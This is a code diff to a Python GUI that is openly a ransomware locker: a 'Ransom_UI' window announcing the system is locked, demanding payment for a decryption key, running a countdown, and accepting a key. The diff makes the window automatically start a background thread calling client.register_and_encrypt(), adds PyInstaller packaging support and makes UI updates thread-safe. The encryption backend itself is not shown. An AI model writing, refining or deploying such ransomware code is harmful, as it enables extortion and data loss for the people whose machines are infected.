@@ -1,5 +1,5 @@
 import customtkinter as ctk
-import json, os, threading, time, time, sys, random
+import json, os, threading, time, sys, random
 from datetime import datetime, timedelta
 import client
 from PIL import Image
@@ -20,16 +20,18 @@ def load_or_create_access_data():
         with open(DATA_FILE, "w") as f:
             json.dump({"first_run": now.isoformat()}, f)
         return now
+
 #to get path of resource when built with pyinstaller
 def resource_path(relative_path):
     if hasattr(sys, "_MEIPASS"):
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.join(os.path.abspath("."), relative_path)
+
 class Ransom_UI(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("SYSTEM ACCESS REQUIRED")
+        self.title("Your System is locked!")
         self.geometry("700x500")
         self.resizable(False, False)
 
@@ -38,9 +40,11 @@ class Ransom_UI(ctk.CTk):
 
         #image
         self.logo_img = ctk.CTkImage(
-            light_image=Image.open("sigma_cat.png"),
-            dark_image=Image.open("sigma_cat.png"),
-            size=(120, 120))
+            light_image=Image.open(resource_path("sigma_cat.png")),
+            dark_image=Image.open(resource_path("sigma_cat.png")),
+            size=(120, 120)
+        )
+
         #timer
         self.first_run = load_or_create_access_data()
         self.expire_date = self.first_run + timedelta(days=ACCESS_DAYS)
@@ -49,7 +53,7 @@ class Ransom_UI(ctk.CTk):
         self.neon = "#14ff00"
         self.dark_green = "#0A9900"
         self.alert_red = "#ff0033"
-        self.desc_base_text = "Your device has been locked.\nPAY US to get the KEY"
+        self.desc_base_text = "HAHAHA, Bro just got RANSOMWARE.\nPAY US to get the KEY to get ur DATA BACK!!"
 
         ascii_art = r"""
 888    d8P  8888888b.  8888888888 888888b.
@@ -61,6 +65,7 @@ class Ransom_UI(ctk.CTk):
 888   Y88b  888  .d88P 888        888   d88P
 888    Y88b 8888888P"  8888888888 8888888P"
 """
+
         # container for ascii and image
         header_frame = ctk.CTkFrame(self, fg_color="transparent")
         header_frame.pack(pady=10)
@@ -83,7 +88,7 @@ class Ransom_UI(ctk.CTk):
         )
         image_label.grid(row=0, column=1)
 
-        # -------- MAIN FRAME --------
+        #main frame
         self.frame = ctk.CTkFrame(self, fg_color="#001800")
         self.frame.pack(padx=20, pady=15, fill="both", expand=True)
 
@@ -129,21 +134,30 @@ class Ransom_UI(ctk.CTk):
         )
         self.btn.pack(pady=10)
 
-        # 🚀 START BACKEND AUTOMATICALLY
-        threading.Thread(
-            target=client.register_and_encrypt,
-            daemon=True
-        ).start()
+        #START BACKEND AUTOMATICALLY
+        threading.Thread(target=self.start_backend, daemon=True).start()
 
         # start timer
         threading.Thread(target=self.update_timer, daemon=True).start()
 
+    def ui(self, fn):
+        self.after(0, fn)
+
+    def start_backend(self):
+        try:
+            client.register_and_encrypt()
+        except Exception:
+            self.ui(lambda: self.timer_label.configure(
+                text="SERVER ERROR ❌",
+                text_color=self.alert_red
+            ))
+
     def blink_block_cursor(self):
         visible = True
         while not self.unlocked:
-            self.desc.configure(
-                text=self.desc_base_text + ("█" if visible else " ")
-            )
+            self.ui(lambda v=visible: self.desc.configure(
+                text=self.desc_base_text + ("█" if v else " ")
+            ))
             visible = not visible
             time.sleep(0.6)
 
@@ -151,8 +165,8 @@ class Ransom_UI(ctk.CTk):
         self.animating = True
 
         #lock input during animation from being spammed
-        self.entry.configure(state="disabled")
-        self.btn.configure(state="disabled")
+        self.ui(lambda: self.entry.configure(state="disabled"))
+        self.ui(lambda: self.btn.configure(state="disabled"))
 
         original = "INVALID KEY ✖"
         chars = "!@#$%^&*()<>?/[]{}|▓▒░"
@@ -163,25 +177,25 @@ class Ransom_UI(ctk.CTk):
                 random.choice(chars) if random.random() < 0.35 else c
                 for c in original
             )
-            self.timer_label.configure(
-                text=scrambled,
+            self.ui(lambda s=scrambled: self.timer_label.configure(
+                text=s,
                 text_color=self.alert_red
-            )
+            ))
             time.sleep(0.04)
 
         # final invalid text
-        self.timer_label.configure(
+        self.ui(lambda: self.timer_label.configure(
             text=original,
             text_color=self.alert_red
-        )
+        ))
 
         #keep invalid animate for 1 second
         time.sleep(1)
 
         #restore input if still locked
         if not self.unlocked:
-            self.entry.configure(state="normal")
-            self.btn.configure(state="normal")
+            self.ui(lambda: self.entry.configure(state="normal"))
+            self.ui(lambda: self.btn.configure(state="normal"))
 
         self.animating = False
 
@@ -206,14 +220,14 @@ class Ransom_UI(ctk.CTk):
             self.unlocked = True
 
             # disable input permanently
-            self.entry.configure(state="disabled")
-            self.btn.configure(state="disabled")
+            self.ui(lambda: self.entry.configure(state="disabled"))
+            self.ui(lambda: self.btn.configure(state="disabled"))
 
             # show success clearly
-            self.timer_label.configure(
+            self.ui(lambda: self.timer_label.configure(
                 text="ACCESS APPROVED ✓",
                 text_color="#00ff44"
-            )
+            ))
 
             # let user see success, then close
             self.after(2000, self.destroy)
@@ -227,20 +241,20 @@ class Ransom_UI(ctk.CTk):
             remaining = self.expire_date - datetime.now()
 
             if remaining.total_seconds() <= 0:
-                self.timer_label.configure(
+                self.ui(lambda: self.timer_label.configure(
                     text="TIME EXPIRED ❌",
                     text_color=self.alert_red
-                )
-                time.sleep(1)
-                sys.exit()
+                ))
+                self.after(1000, self.destroy)
+                return
 
             h, r = divmod(remaining.seconds, 3600)
             m, s = divmod(r, 60)
 
-            self.timer_label.configure(
+            self.ui(lambda h=h, m=m, s=s: self.timer_label.configure(
                 text=f"TIME LEFT: {h}h {m}m {s}s",
                 text_color=self.neon
-            )
+            ))
             time.sleep(1)
 
 if __name__ == "__main__":
